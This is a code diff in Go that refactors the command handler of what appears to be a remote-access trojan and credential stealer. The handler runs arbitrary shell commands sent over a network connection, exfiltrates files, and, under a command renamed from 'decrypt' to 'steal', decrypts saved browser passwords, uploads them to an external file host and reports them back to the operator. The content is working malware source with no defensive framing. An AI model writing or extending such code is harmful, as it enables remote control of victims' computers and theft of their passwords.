@@ -97,8 +97,12 @@ func handleServerConnection(conn net.Conn) {
 }
 
 func ParseCommands(input string, conn net.Conn) {
-	if strings.HasPrefix(input, "cmd") {
-		args := ParseArgs(input, "cmd")
+	split := strings.Split(input, " ")
+	actionName := split[0]
+	args := split[1:]
+
+	switch actionName {
+	case "cmd":
 		command := exec.Command(args[0], args[1:]...)
 
 		output, err := command.Output()
@@ -108,9 +112,8 @@ func ParseCommands(input string, conn net.Conn) {
 
 		outputString := strings.TrimSpace(string(output))
 		SendResponse(conn, outputString)
-	} else if strings.HasPrefix(input, "files") {
-		args := ParseArgs(input, "files")
-
+		break
+	case "files":
 		var sb strings.Builder
 		sb.WriteString("Received files: \n")
 
@@ -125,8 +128,8 @@ func ParseCommands(input string, conn net.Conn) {
 		}
 
 		SendResponse(conn, strings.TrimRight(sb.String(), "\n"))
-	} else if strings.HasPrefix(input, "download") {
-		args := ParseArgs(input, "download")
+		break
+	case "download":
 		originalFile := args[0]
 
 		split := strings.Split(originalFile, string(os.PathSeparator))
@@ -138,8 +141,8 @@ func ParseCommands(input string, conn net.Conn) {
 		_ = os.Remove(tempFile.Name())
 
 		SendResponse(conn, file)
-	} else if strings.HasPrefix(input, "decrypt") {
-		args := ParseArgs(input, "decrypt")
+		break
+	case "steal":
 		option := args[0]
 
 		for browser, path := range browsers {
@@ -184,6 +187,7 @@ func ParseCommands(input string, conn net.Conn) {
 
 			SendResponse(conn, fmt.Sprintf("Decrypted %s data from %s\nPassword: %s\nURL: %s", option, browser, password, uploadFile))
 		}
+		break
 	}
 }
 
@@ -194,10 +198,6 @@ func UploadFile(pathToFile string) string {
 		return ""
 	}
 	return data.Data.File.URL.Full
-}
-
-func ParseArgs(input string, command string) []string {
-	return strings.Fields(strings.TrimPrefix(input, command+" "))
 }
 
 func SendResponse(conn net.Conn, response string) {
